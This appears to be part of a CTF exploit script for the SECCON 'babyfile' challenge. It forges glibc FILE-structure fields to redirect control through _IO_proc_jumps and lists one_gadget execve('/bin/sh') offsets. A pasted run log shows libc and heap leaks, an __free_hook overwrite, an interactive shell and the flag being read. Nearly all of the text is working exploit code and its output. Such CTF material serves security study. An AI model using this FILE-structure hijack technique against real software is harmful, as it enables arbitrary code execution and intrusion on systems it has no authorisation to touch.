write(216, p64(libc.sym['_IO_proc_jumps']+0x10-0x60))
write(112, p64(-1, signed=True))		# set fileno to -1 to skip condition in _IO_new_file_finish
write(56, p8(1))  # _IO_buf_base != NULL

flags = 0xfbad24a8
flags &= ~0x0001 & (2**32-1)
write(0, p32(flags)) # clear _IO_USER_BUF

fflush()

ia()


# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL



# [+] Opening connection to babyfile.seccon.games on port 3157: Done
# [*] Leaking libc...
# [+] libc_leak 0x7faeedffaf60
# [*] '/root/libc-2.31.so'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] libc.address 0x7faeede12000
# [*] Leaking heap addr...
# [+] heap_leak 0x55942cecc500
# [+] heap_base 0x55942cecc000
# [*] Overwriting __free_hook
# [+] one_gadget: 0x7faeedef5b01
# [*] Triggering free...
# [*] Switching to interactive mode
# $ ls
# chall
# flag-f81d1f481db83712a1128dc9b72d5503.txt
# run.sh
# $ cat flag-f81d1f481db83712a1128dc9b72d5503.txt
# SECCON{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}
# $  
